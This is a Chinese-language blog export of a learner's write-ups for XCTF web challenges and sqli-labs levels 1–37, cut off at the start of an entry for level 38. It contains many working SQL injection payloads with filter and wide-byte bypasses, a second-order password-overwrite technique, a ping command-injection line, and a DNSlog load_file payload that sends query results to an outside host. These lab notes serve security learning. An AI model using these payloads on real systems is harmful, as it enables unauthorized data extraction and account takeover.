<p><img src="%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C.md/2.png"></p>
<p>a==0 并且$a的值要存在，才能返回true 执行echo $flag1</p>
<p>由于php弱类型比较，所以令a=a时,a==0返回true，且$a返回true，如果令a=0，则会导致$a返回false。</p>
<p>第二个if语句，is_numeric检测变量是否为数字或数字字符串，是返回true，不是返回false</p>
<p>在字符串与数字进行比较时，会转化成同类型再比较(php弱类型比较，较不严格)，会使b=1235a转化成1235再与1234进行比较。</p>
<p>可以参考文章<a href="https://www.php.net/manual/zh/types.comparisons.php">https://www.php.net/manual/zh/types.comparisons.php</a></p>
<h3 id="get-post"><a href="#get-post" class="headerlink" title="get post"></a>get post</h3><p>使用hackbar进行post方式提交参数，在url进行get方式提交参数。</p>
<h3 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h3><p>必须要知道消息报头的一些知识。</p>
<h4 id="HTTP请求报文–消息报头"><a href="#HTTP请求报文–消息报头" class="headerlink" title="HTTP请求报文–消息报头"></a>HTTP请求报文–消息报头</h4><p><strong>Accept-Language:浏览器可接受的语言。</strong><br><strong>Cookie(小饼干):HTTP请求发送时，会把在该请求域名下的所有cookie值一起发送给web服务器。就像我们在网页登陆时，账户已经存在。</strong><br><strong>Content-Length:请求的内容长度。</strong><br><strong>Content-TyPe:请求的内容对应的MIME信息，也叫互联网媒体类型</strong><br><strong>Host:指定请求的服务器的域名和端口号。</strong><br><strong>User-Agent:User-Agent的内容包含发出请求的用户信息。</strong><br><strong>Referer:表示当前是从哪个页面上的链接触发的。</strong><br><strong>X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项<br>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的。</strong></p>
<p>使用burp先添加ip地址，再添加refer值。</p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><p>使用蚁剑连接一句话木马即可。</p>
<h3 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h3><p>这是一道简单有关ping命令执行恶意代码题，没有任何过滤机制。</p>
<p>直接ip地址接命令执行语句。</p>
<p>随便使用一个拼接符执行命令即可，这里有关命令执行的语句可以回看dvwa靶场的命令执行。</p>
<p><code>127.0.0.1|find -name &quot;flag.txt&quot;</code></p>
<p>这里找不到文件的时候，需要一级一级访问目录寻找flag。</p>
<h3 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h3><p>这是一题有关javascript的代码审计。</p>
<p><img src="%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C.md/3.png"></p>
<p>看到最后一句不管输入什么密码，都会跳出假密码，真密码位于fromCharCode。</p>
<p>编码为base16，先使用python处理获得数组，再将数组分别进行ascii处理。</p>
<p><img src="%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C.md/4.png"></p>
<p><img src="%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C.md/5.png"></p>
<p>获得的为flag的内容。</p>
]]></content>
      <tags>
        <tag>攻防世界</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs18、19、20</title>
    <url>/2020/12/04/sqli-labs/18~19/</url>
    <content><![CDATA[<h3 id="头部注入"><a href="#头部注入" class="headerlink" title="头部注入"></a>头部注入</h3><h4 id="usename，password被过滤了"><a href="#usename，password被过滤了" class="headerlink" title="usename，password被过滤了"></a>usename，password被过滤了</h4><pre><code>无法通过注入usename，password获取信息/*对用户名和密码进行过滤 */
</code></pre>
<p><img src="18~19.md/0.png"><br>    分析源码发现有insert语句，将uagent，ip，$uname，插入数据库，uname无法注入，从其他两个下手。</p>
<h4 id="SERVER"><a href="#SERVER" class="headerlink" title="$_SERVER"></a>$_SERVER</h4><pre><code>$_SERVER是一个包含头信息、路径以及脚本位置等等信息的数组，由web服务器创建，不能保证每个服务器都提高全部项目。
注意: PHP 5.4.0 之前，$HTTP_SERVER_VARS 包含着相同的信息，但它不是一个超全局变量。 
(注意 $HTTP_SERVER_VARS 与 $_SERVER 是不同的变量，PHP处理它们的方式不同)
$_SERVER[‘HTTP_USER_AGENT’] //当前请求的 User_Agent: 头部的内容。
$_SERVER[‘REMOTE_ADDR’] //当前用户 IP 。
对于ip和urgent没有被过滤，可以注入。
User-Agent:浏览器的用户代理字符串。
在user-agent中输入以下语句时：&#39;单引号报错  &#39;#单引号加注释报错 &#39;and &#39;1&#39;=&#39;1 单引号+and+等式，正常显示。利用burp抓包修改，
`User-Agent: &#39; and extractvalue(1,concat(0x7e,(select version()),0x7e)) and&#39;1&#39;=&#39;1`其他的数据也可爆出。
Referer:发出请求的页面的URI。
学会看源码
* 补充一下，之前都报错不出来，原来是账户密码登陆错误，要登陆才能进行注入。
* 因为在源码sql语句中user-agent处后台已经加了单引号，在报错时记得加and&#39;进行闭合，不然报不出结果。
</code></pre>
<h3 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h3><p><strong>第一步：登陆，成功登陆。</strong></p>
<p>在user-agent构造payload<br><img src="18~19.md/1.png"><br>奇怪了为什么报错语句不行？看了大佬博客原因在：源码中语句：<br><img src="18~19.md/2.png"><br>uagent是在IP和uname之前的，如果注释掉后面的语句，会直接导致Insert语句直接异常，达不到我们查询的目的，<br>所以改成<br><img src="18~19.md/3.png"><br>成功。</p>
<h3 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h3><p>改成在referer构造payload。<br><img src="18~19.md/4.png"><br>其他不再赘述。</p>
<h3 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h3><p>同样uname和passwd都被过滤了，而cookie没有，直接可以获取。我们先了解一下什么是</p>
<h4 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie:"></a>Cookie:</h4><p>Cookie，有时也用其复数形式 Cookies。<br>类型为“小型文本文件”，是某些网站为了辨别用户身份，进行Session跟踪而储存在用户本地终端上的数据（通常经过加密），由用户客户端计算机暂时或永久保存的信息。<br>查看为单引号闭合性，使用一下联合查询语句，即可。<br><code>uname=1&#39; union select 1,2,3#</code><br><img src="18~19.md/5.png"><br>爆库<br><code>uname=1&#39; union select 1,2,database()#</code><br><img src="18~19.md/6.png"><br>剩下的可以都可以爆出。</p>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs11~16</title>
    <url>/2020/12/03/sqli-labs/11~16/</url>
    <content><![CDATA[<h3 id="POST-型注入"><a href="#POST-型注入" class="headerlink" title="POST 型注入"></a>POST 型注入</h3><p>一般存在搜索框或登入页面位置</p>
<h4 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h4><pre><code>输入到框内。
加\先判断注入类型，猜测注入点在用户名，加个单引号成功了。
</code></pre>
<p><img src="11~16.md/0.png"><br>    usename:wang’#    password:随意。<br>    有回显，后使用联合查询注入，字段数为2，即可依次爆破。<br>    还可用报错语句进行注入。<br>    <code>wang&#39; and updatexml(1,concat(0x7c,database()),1)#</code><br><img src="11~16.md/1.png"><br>    后面的依次爆出。</p>
<h4 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h4><pre><code>改成admin&quot;)# 
有回显，在用联合查询注入，同样跟十一关一样
</code></pre>
<h4 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h4><pre><code>改成admin&#39;)即可，使用报错注入。
</code></pre>
<h4 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h4><pre><code>改成admin&quot;即可。
</code></pre>
<h4 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h4><pre><code>输入admin&#39;可登陆，在用上面的联合注入，报错注入不可。再试一下length语句测试数据库长度，回显正常。
`admin&#39; and length(database())=8#`
使用布尔盲注，`admin&quot;) and left(database(),1)=&#39;s&#39;#`
成功，后面就可以依次爆出。
</code></pre>
<h4 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h4><pre><code>输入admin&quot;)登陆成功
后面跟15一样。
也可以用时间盲注，`admin&quot;) and if(left(database(),1)=&#39;s&#39;,sleep(5),1)#` 正确后页面会延迟，且页面无显示，十五关也可。
</code></pre>
<h4 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h4><pre><code>这次要换个思路了，在uname无法注入，查看码源，只有uname被过滤，试一下password回显正常。
</code></pre>
<p><img src="11~16.md/1.5.png"><br>    uname要输入本来就有的用户，一般用admin。<br>    password：<code>1&#39; and updatexml(1,concat(0x7c,database()),1)#</code> 用报错注入即可，联合注入不行。<br><img src="11~16.md/2.png"></p>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs1</title>
    <url>/2020/11/12/sqli-labs/1~4/</url>
    <content><![CDATA[<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4><h5 id="首先判断注入点的类型"><a href="#首先判断注入点的类型" class="headerlink" title="首先判断注入点的类型"></a>首先判断注入点的类型</h5><p>只有单引号出现报错，单引号为注入点。<br><code>?id=1&#39;</code><br><img src="1~4.md/1.png"></p>
<h5 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h5><p><code>?id=1&#39;order by 4--+</code>(多次猜测可得出有3列)</p>
<h4 id="将1改成不存在数据库的，得出2，3列有回显。"><a href="#将1改成不存在数据库的，得出2，3列有回显。" class="headerlink" title="将1改成不存在数据库的，得出2，3列有回显。"></a>将1改成不存在数据库的，得出2，3列有回显。</h4><p><code>?id=-1&#39; union select 1,2,3--+</code><br><img src="1~4.md/2.png"></p>
<h4 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h4><p><code>?id=-1&#39; union select 1,2,database()--+</code> 得出security。<br><img src="1~4.md/3.png"></p>
<h4 id="爆数据表"><a href="#爆数据表" class="headerlink" title="爆数据表"></a>爆数据表</h4><p><code>?id=-1&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;--+</code><br><img src="1~4.md/4.png"></p>
<h4 id="爆user表的列"><a href="#爆user表的列" class="headerlink" title="爆user表的列"></a>爆user表的列</h4><p><code>?id=-1&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39;--+</code><br><img src="1~4.md/5.png"></p>
<h4 id="爆用户名和密码"><a href="#爆用户名和密码" class="headerlink" title="爆用户名和密码"></a>爆用户名和密码</h4><p><code>?id=-1&#39; union select 1,2,group_concat(username,&#39;-&#39;,password) from users --+</code><br><img src="1~4.md/6.png"></p>
<h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>判断类型：为数字注入型。将id=1改成id=-1即可，改成一个不存在数据库的即可。</p>
<h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><h4 id="字符型注入。"><a href="#字符型注入。" class="headerlink" title="字符型注入。"></a>字符型注入。</h4><h5 id="判断类型：只有输入”回显正常，为注入点。"><a href="#判断类型：只有输入”回显正常，为注入点。" class="headerlink" title="判断类型：只有输入”回显正常，为注入点。"></a><strong>判断类型：只有输入”回显正常，为注入点。</strong></h5><p>说明此处为字符型注入，且是以(‘’)的方式闭合字符串的；这里的’   ‘ 不是”  “ 。</p>
<h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>改成”)即可。</p>
<h3 id="—补充使用dnslog注入方法："><a href="#—补充使用dnslog注入方法：" class="headerlink" title="—补充使用dnslog注入方法："></a>—补充使用dnslog注入方法：</h3><p>使用网址<a href="http://dnslog.cn/">http://dnslog.cn/</a><br>输入：<br><code>?id=1&#39; and (select load_file(concat(&#39;////&#39;,database(),&#39;.qcmie7.dnslog.cn/abc&#39;)))--+</code></p>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs2122</title>
    <url>/2020/12/08/sqli-labs/21~22/</url>
    <content><![CDATA[<h3 id="sqli-labs21"><a href="#sqli-labs21" class="headerlink" title="sqli-labs21"></a>sqli-labs21</h3><p>1、输入账户密码，登陆成功，获得信息。发现uname=后面的用户名被转义了。<br><img src="21~22.md/1.png"><br>2、查看源码，发现原来cookie内容被base64加密了，所以输入的用户名也被加密了，加密后信息就无法直接读取，在用解密刚刚页面的用户名，得到原来输入的用户名。<br><img src="21~22.md/2.png"><br>3、判断注入点 :<br><img src="21~22.md/3.png">成功<br>使用联合查询注入<br><code>uname=MScpIHVuaW9uIHNlbGVjdCAxLDIsMy0tICM=</code><br><img src="21~22.md/4.png"></p>
<h3 id="sqli-labs22"><a href="#sqli-labs22" class="headerlink" title="sqli-labs22"></a>sqli-labs22</h3><p>改成”即可。</p>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs23</title>
    <url>/2020/12/09/sqli-labs/23/</url>
    <content><![CDATA[<h3 id="又回到get类型了，输入-id-1-39-只有加单引号的报错，尝试以前的方法都行不通，肯定有了新花样，查看源码。"><a href="#又回到get类型了，输入-id-1-39-只有加单引号的报错，尝试以前的方法都行不通，肯定有了新花样，查看源码。" class="headerlink" title="又回到get类型了，输入?id=1&#39;只有加单引号的报错，尝试以前的方法都行不通，肯定有了新花样，查看源码。"></a>又回到get类型了，输入<code>?id=1&#39;</code>只有加单引号的报错，尝试以前的方法都行不通，肯定有了新花样，查看源码。</h3><p><img src="23.md/0.png"></p>
<h4 id="了解一下preg-replace-函数"><a href="#了解一下preg-replace-函数" class="headerlink" title="了解一下preg_replace()函数"></a>了解一下preg_replace()函数</h4><p><strong>preg_replace(pattern,replacement,subject)</strong><br><strong>pattern:要搜索的模式，可以是字符串或字符数组。</strong><br><strong>replacement:用于替换的字符串或字符数组。</strong><br><strong>subject:要搜索替换的目标字符串或字符数组。</strong><br>在这关中，也只是将#和–替换成了空字符，相当于#和–被过滤了。<br>尝试注入点，单引号报错<br><img src="23.md/1.png"></p>
<h4 id="开始尝试用单引号闭合注入"><a href="#开始尝试用单引号闭合注入" class="headerlink" title="开始尝试用单引号闭合注入"></a>开始尝试用单引号闭合注入</h4><p><code>?id=1&#39; order by 4 and &#39;1&#39;=&#39;1</code><br><img src="23.md/2.png"><br><strong>语句没有报错，在后台数据库查询寻找原因。</strong><br><code>select * from users where id=1 order by &#39;4&#39;;</code><br>没有报错，因为加了引号，数据库不会执行该语句，因为order by 后面的字段不能加引号。<br><img src="23.md/3.png"><br>再输入<br><code>select * from users where id=1 order by 4 and &#39;1&#39;=&#39;1&#39;;</code>也没有报错<br><img src="23.md/4.png"><br>order by 在where条件中，在where执行时被忽略了，所以没有报错。<br>再输入<code>select *from users where id=&#39;1&#39; and &#39;1&#39;=&#39;1&#39; order by 4; </code>报错，<br><img src="23.md/5.png"><br>在MySQL执行顺序中，where远在order by前。最后一句报错，因为and ‘1’=’1’是where的条件，先执行，得到结果集，然后执行order by 报错。<br><strong>因为where和order by 都是子句，and是操作符，用于where子句。</strong></p>
<h4 id="所以这关不能用order-by-判断字段数。直接用联合注入："><a href="#所以这关不能用order-by-判断字段数。直接用联合注入：" class="headerlink" title="所以这关不能用order by 判断字段数。直接用联合注入："></a>所以这关不能用order by 判断字段数。直接用联合注入：</h4><pre><code>`?id=1&#39; union select 1,2,3 and &#39;1&#39;=&#39;1`这里用and 或or是一样的，它作为第二个select语句条件，sql1 union sql2 union查询必须保证查询字段数量一致，否则报错。
当union select 1，2，3为真时，得到数据，为假时报错。
把1改成-1，使原查询左边为空，使我们定义的查询结果返回。
</code></pre>
<p><img src="23.md/6.png"><br>    在字段3注入会出现问题,返回值为0<br><img src="23.md/7.png"><br>    页面的1不是select1，2，3中的1，原因是or ‘1’=’1是作为字段3逻辑操作符，为永真条件，返回1，and则为错误，所以返回为0，故不能在字段3注入。<br><img src="23.md/8.png"><br>    侧面说明or优先级别高于select<br>    2为唯一注入点了，接下来都差不多了。<br><strong>爆数据的时候记得，不能直接from users ，因为from 和 and 是不能连在一起的</strong><br>    添加在from后面加where 1即可</p>
<h3 id="补充另外一种方法"><a href="#补充另外一种方法" class="headerlink" title="补充另外一种方法"></a>补充另外一种方法</h3><pre><code>因为select 1=select &#39;1&#39;
所以可以直接在字段3后单引号闭合。
`?id=-1&#39; union select 1,(select group_concat(concat(username,password))from users),&#39;3`
</code></pre>
<p><img src="23.md/9.png"></p>
<h3 id="还有，联合查询中还能加报错语句。"><a href="#还有，联合查询中还能加报错语句。" class="headerlink" title="还有，联合查询中还能加报错语句。"></a>还有，联合查询中还能加报错语句。</h3><pre><code>`?id=1&#39; union select 1 ,(updatexml(1,concat(0x7c,(select concat(username,password) from users limit 0,1)),1)),&#39;3`
</code></pre>
<p><img src="23.md/10.png"><br>一般不会这样，有时候不知道哪个字段有回显，而且回报的数据还会被限制长度，还不如直接联合查询注入。</p>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs24</title>
    <url>/2020/12/10/sqli-labs/24/</url>
    <content><![CDATA[<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>原理:<strong>在http请求中提交恶意输入，保存到数据库中，第二次提交http请求，构造sql语句注入,虽然参数在过滤后会添加\进行转义，但是\并不会插入到数据库中，这样就可以利用这个构造一个二次注入。</strong><br>最开始尝试了登陆，按照页面的反应进行操作，就是注册登陆，还有修改自己的原密码。<br>也不知道是要做什么，看了源代码，也是一脸懵逼，只好借鉴大佬了。<br>出现频率最高的代：<strong>session_start()函数</strong><br>session_start() 会创建新会话或者重用现有会话。 如果通过 GET 或者 POST 方式，或者使用 cookie 提交了会话 ID， 则会重用现有会话。<br>session_start的作用是开启$_SESION,需要在$_SESION使用之前调用。<br>PHP $_SESION 变量用于存储关于用户会话（session）的信息<br><strong>mysql_real_escape_string() 函数：</strong><br><strong>mysql_real_escape_string(string,connection)</strong><br><strong>string:必需，规定要转义的字符</strong><br><strong>connection:可选，规定MySQL连接</strong><br>下列字符受影响：<br>\x00<br>\n<br>\r<br><br>‘<br>“<br>\x1a<br>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。<br><img src="24.md/3.png">username,password，re_password字段所投递的字符都被转义了，重心就放在修改密码的sql语句中。<br><strong>在查看源代码时，特别注意sql语句,注入点在修改密码上。</strong><br><img src="24.md/0.png"><br><strong>重点：从session中直接获得了当前用户名，且被直接用于更新语句并未做检查。</strong><br><strong>从根本上来说，插入数据时没有过滤，只是做了转义处理。</strong><br><strong>若当前用户名中含有注释，便可以修改当前用户名中包含的另一用户的密码，例如注册用户：Dumb’# 那么他就可以修改用户Dumb的密码。</strong><br><img src="24.md/4.png"><br>思路：<strong>注意到修改密码的sql语句，我们就可以创建一个含同名含单引号注释符的用户名来修改原来用户名的密码。</strong><br><strong>原SQL语句：<br><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39;</code><br>修改密码sql语句：<br><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;#&#39; and password=&#39;$curr_pass&#39;</code><br>最后真正执行的sql语句：<br><code>UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;admin&#39;</code></strong><br>操作：<br>注册好后登陆,就能修改密码了更新成功。<br>先创建一个和admin类似的用户名(admin’#)<br><img src="24.md/1.png"><br>登陆后，进入修改密码页面修改，成功篡改其他用户的密码。<br><img src="24.md/2.png"></p>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs25~28</title>
    <url>/2020/12/10/sqli-labs/25/</url>
    <content><![CDATA[<h3 id="Less-25"><a href="#Less-25" class="headerlink" title="Less-25"></a>Less-25</h3><p>很明显，or,and,被过滤了。<br>首先正常输入，<code>?id=1&#39;</code>报错了，发现为注入点。<br>这里要了解一个双写绕过注入：**or改成oorr，and改成anandd **<br>思路：要先判断是一次性绕过还是非一次性过滤，如果是一次性就用双写绕过，如果是非一次性考虑其它变形。<br>eg：大小写变形绕过OR=oR=Or=or<br>    利用运算符or=|| ,and=&amp;&amp;<br>            URL编码绕过:#=%23<br>    Hex编码:~=0x7e<br>    添加注释:/<em>or</em>/还有其他等等。<br>所以使用联合查询注入：<code>?id=-1&#39; union select 1,2,group_concat(username,passwoorrd)from users--+</code><br><img src="25.md/0.png"><br>还能使用报错注入，这里使用&amp;&amp;会报错。(原因？？)<br><code>?id=-1&#39; || updatexml(1,concat(0x7c,database()),1)--+</code><br><img src="25.md/1.png"><br>布尔盲注等等。。。</p>
<h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p>查看源码，sql语句为数字型注入，与第二关一样类型，再用和25关一样即可。<br>但是不能用报错注入，被注释了。</p>
<h3 id="Less-26"><a href="#Less-26" class="headerlink" title="Less-26"></a>Less-26</h3><p>首先判断注入点，为?id=1’再查看源代码，这里过滤掉了很多东西。<br>过滤了# or and 多行单行注释 斜杠 空格 反斜杠。<br>所以就要找其他的来代替空格注释？？？<br>空格URL编码替代方法：%a0(空格),%0a(新建一行),%0b(TAB垂直),%0c(新的一页),%0d(return功能),%09(TAB水平)<br>尝试了联合注入，不知道为什么一直不行，尝试报错注入就可以。？？？<br>爆表<br><code>?id=0&#39;||updatexml(1,concat(0x7c,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;))),0)||&#39;1&#39;=&#39;1</code><br>这里用updatexml可以省去空格过滤得烦恼。记得加0x7c，不然有一个表会被吃掉<br><strong>这里还通过加()方式省去了打空格。</strong>减少错误的发生<br><img src="25.md/2.png"><br>爆用户名和密码<br><code>?id=0&#39;||updatexml(1,concat(0x7c,(select(group_concat(username,passwoorrd))from(users))),0)||&#39;1&#39;=&#39;1</code><br><img src="25.md/3.png"><br>这里如果把||改成anandd也不行.?对于报错原理还是不太行。</p>
<h4 id="PHP版本问题"><a href="#PHP版本问题" class="headerlink" title="PHP版本问题"></a>PHP版本问题</h4><p>因为版本问题，我输入的URL编码代替空格都会出现错误。这里把PHP版本换成5.2.17比较旧的版本。<br>就可以使用联合查询注入了，哈哈哈研究半天。。。不过也只有%0b、%a0可以用。</p>
<h3 id="Less-26a"><a href="#Less-26a" class="headerlink" title="Less-26a"></a>Less-26a</h3><p>换成’)即可，记得后面条件闭合语句也要改成(‘1’)=(‘1来进行闭合。<br>列举一个：<br><code>?id=&#39;)union%0bselect%0b1,group_concat(username,passwoorrd),3%0bfrom%0busers%0bwhere%0b(&#39;9&#39;)=(&#39;9</code><br><strong>还有这里输入?id=-1没有正确回显，让id=null(空值)如：?id=-100也可以。借此还可以查有几个用户，或者0才有正确回显，但是为什么？</strong><br><img src="25.md/4.png"></p>
<h3 id="Less-27"><a href="#Less-27" class="headerlink" title="Less-27"></a>Less-27</h3><p>从题目知道union、select被过滤了<br>查看源码：在26关基础上多过滤了union和select但是and，or这次没被过滤了。<br>尝试注入点：?id=1’报错，为单引号闭合型。</p>
<p><strong>这边order by语句一直报错？回看23关有解释。</strong></p>
<h4 id="直接查注入点"><a href="#直接查注入点" class="headerlink" title="直接查注入点"></a>直接查注入点</h4><p><code>?id=-100&#39;UnION%0bSElEct%0b1,2,3%0b||&#39;1&#39;=&#39;1</code><br><img src="25.md/5.png"><br>成功，还是要在字段2进行注入。字段一已经被1代替。</p>
<h4 id="查数据库"><a href="#查数据库" class="headerlink" title="查数据库"></a>查数据库</h4><p><code>?id=-100&#39;UnION%0bSElEct%0b1,database(),3%0b||&#39;1&#39;=&#39;1</code><br><img src="25.md/6.png"></p>
<h4 id="直接查用户名和密码"><a href="#直接查用户名和密码" class="headerlink" title="直接查用户名和密码"></a>直接查用户名和密码</h4><p><code>?id=-100&#39;UnION%0bSElEct%0b1,group_concat(username,&#39;-&#39;,password),3%0bfrom%0busers%0bwhere%0b&#39;1&#39;=&#39;1</code><br><img src="25.md/7.png"><br>使用第23关类似，直接用3闭合,也是可以的，更好。<br><code>?id=-15&#39;%0bUnIoN%0bsElEct%0b1,(sElEct%0bgroup_concat(concat(username,password))from%0busers),&#39;3</code><br><img src="25.md/8.png"><br>这里强调一下：<strong>记得用函数group_concat,它能够让返回的数据在一行，如果没用，会出现长度过长，数据爆不出来。</strong></p>
<h3 id="Less-27a"><a href="#Less-27a" class="headerlink" title="Less-27a"></a>Less-27a</h3><p>改成双引号即可。</p>
<h3 id="Less-28、28a"><a href="#Less-28、28a" class="headerlink" title="Less-28、28a"></a>Less-28、28a</h3><p>改成’)闭合就行，不过这里的?id=null跟26一样。<br>举个例子把:<br><code>?id=-15&#39;)UniOn%0b%0bSelEct%0b1,group_concat(username,password),3%0bfrom%0busers%0bwhere(&#39;1&#39;)=(&#39;1</code><br>还有简便方法：<br><code>?id=-15&#39;)%0BuNiOn%0BsElEct%0B1,(sEleCT%0bgroup_concat(username,password)from%0busers),(&#39;3</code></p>
<h3 id="Less-28a：这里跟28差不多，但是这里的-id-1不用是null？"><a href="#Less-28a：这里跟28差不多，但是这里的-id-1不用是null？" class="headerlink" title="Less-28a：这里跟28差不多，但是这里的?id=-1不用是null？"></a>Less-28a：这里跟28差不多，但是这里的?id=-1不用是null？</h3>]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs29~31</title>
    <url>/2020/12/12/sqli-labs/29/</url>
    <content><![CDATA[<p>这三关我都试了一下联合查询注入，都可以过。跟前三关一模一样，它的防火墙呢？不知道想考什么？<br>看了大佬博客，是双服务器问题，但是我却能简单联合查询注入，估计又是版本问题</p>
<h3 id="补充一下知识点："><a href="#补充一下知识点：" class="headerlink" title="补充一下知识点："></a>补充一下知识点：</h3><p><strong>服务器有两个部分</strong><br>第一部分为 tomcat 为引擎的 jsp 型服务器<br>第二部分为 apache 为引擎的 php 服务器<br>真正为web服务的是php。<br>试了几个版本，也不行。<br>查看源码。又有一个login.php<br>这一关还要自己构造防御。<br>在源码加入login.php即可.<br>输入<code>login.php?id=1</code>出现<br>说明参数被waf挡住了，我们需要在构造一个参数。<br><code>?id=1&amp;id=1--+</code>成功绕过waf。</p>
<h3 id="测试注入点"><a href="#测试注入点" class="headerlink" title="测试注入点"></a>测试注入点</h3><p><strong>尝试单引号和双引号都不报错，再接下来尝试两种就可以判断是单引号闭合型，双引号会被认做两个单引号就形成闭合了，导致不好判断。</strong><br>还有这里只能使用&amp;其他的行不通。为什么呢？</p>
<h3 id="30"><a href="#30" class="headerlink" title="30"></a>30</h3><p>改成”即可。</p>
<h3 id="31"><a href="#31" class="headerlink" title="31"></a>31</h3><p>改成”)即可。</p>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs32~35</title>
    <url>/2020/12/12/sqli-labs/32/</url>
    <content><![CDATA[<h3 id="Less-32"><a href="#Less-32" class="headerlink" title="Less-32"></a>Less-32</h3><p>先试一下单引号注入，多了一个?<br>查看一下源码。<br>多了一个函数：addslashes()<br>了解一下这个函数：在 单引号 ‘，双引号 “，反斜杠 \还有NULL前面加上反斜杠\。<br>源码中使用的是gbk编码，gbk两个编码就代表一个汉字，再\前面加%df就形成一个汉字，单引号逃逸出来。<br>了解一下宽字节：<a href="https://blog.csdn.net/weixin_39934520/article/details/105870860">https://blog.csdn.net/weixin_39934520/article/details/105870860</a> 来自大佬博客。<br>这样就ok了举个例子吧：<br><code>?id=-1%bb&#39; union select 1,2,group_concat(username,password)from users--+</code><br><img src="32.md/0.png"></p>
<h3 id="Less-33"><a href="#Less-33" class="headerlink" title="Less-33"></a>Less-33</h3><p>Less-32是自定义的过滤器，本关直接使用了 PHP 的addslashes()函数<br>addslashes()与stripslashes()函数<br>addslashes(string)函数返回在预定义字符之前添加反斜杠\的字符串：<br>单引号 ‘<br>双引号 “<br>反斜杠 <br>空字符 NULL<br>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。<br>注意：默认地，PHP对所有的GET、POST和COOKIE数据自动运行addslashes()。所以不应对已转义过的字符串使用addslashes()，因为这样会导致双层转义。遇到这种情况时可以使用函数get_magic_quotes_gpc()进行检测。<br>stripslashes(string)函数删除由addslashes()函数添加的反斜杠。</p>
<h3 id="Less-34"><a href="#Less-34" class="headerlink" title="Less-34"></a>Less-34</h3><p>post型<br>正常登入，本题也是宽字节注入。<br>这题不是get型，不是以URL形式提交的？其实还是差不多的。<br>但是直接在页面输入，怎么试都错误，应该是post型提交有不一样。打开burp抓包<br>果然%被转义成%25，在burp换成%即可。</p>
<h3 id="Less-35"><a href="#Less-35" class="headerlink" title="Less-35"></a>Less-35</h3><p>定型：为含addslashes数字型注入。<br>基本和第二关差不多了。<br>**但是特别注意有引号的，’security’要变成16进制，这是MySQL本身支持的查询方式，也就不需要用到单引号了。</p>
<h3 id="Less-36-amp-amp-Less-37"><a href="#Less-36-amp-amp-Less-37" class="headerlink" title="Less-36&amp;&amp;Less-37"></a>Less-36&amp;&amp;Less-37</h3><p>也是宽字节注入，加入%df和/组成一个字符。</p>
]]></content>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs38~45</title>
    <url>/2020/12/12/sqli-labs/38/</url>
